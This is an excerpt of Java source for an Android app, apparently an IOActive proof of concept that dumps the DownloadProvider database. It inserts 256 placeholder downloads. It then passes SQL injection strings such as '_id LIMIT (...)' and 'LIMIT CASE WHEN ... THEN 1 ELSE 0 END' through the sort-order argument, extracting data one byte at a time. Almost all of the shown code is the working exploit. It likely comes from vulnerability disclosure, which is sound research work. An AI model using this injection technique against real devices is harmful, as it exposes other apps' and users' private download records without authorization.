package com.ioactive.downloadProviderDbDumperSQLiLimit;
...
public class MainActivity extends AppCompatActivity {
    ...
    private static final String TAG = "DwnPrvDumperLimit";
    ...
    private void ensureAccessibleRows() {
        // Make sure we have at least 256 accessible downloads to retrieve one byte at a time.
        Cursor cur = null;
        try {
            ...
            cur = res.query(uri, null, null, null, null);
            if (cur == null || cur.getCount() < 256) {
                log("Initializing. PLEASE WAIT...\n");
                insertNewDownloads(cur.getCount());
            }
        } finally {
            if (cur != null)
                cur.close();
    ...
    private void insertNewDownloads(int existingRows) {
        ContentResolver res = this.getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);
        String cacheDir = getCacheDir().getAbsolutePath();

        for (int i = existingRows; i <= 256; i++) {
    ...
    private int extractByte(String sqlExpression) {
        ...
        String injection = "_id LIMIT (" + sqlExpression + ")";
        Cursor cur = res.query(uri, new String[]{"_id"}, null, null, injection);
    ...
    private boolean isTrueCondition(String sqlCondition) {
        ...
        String injection = "_id LIMIT CASE WHEN (" + sqlCondition + ") THEN 1 ELSE 0 END";
        Cursor cur = res.query(uri, new String[]{"_id"}, null, null, injection);
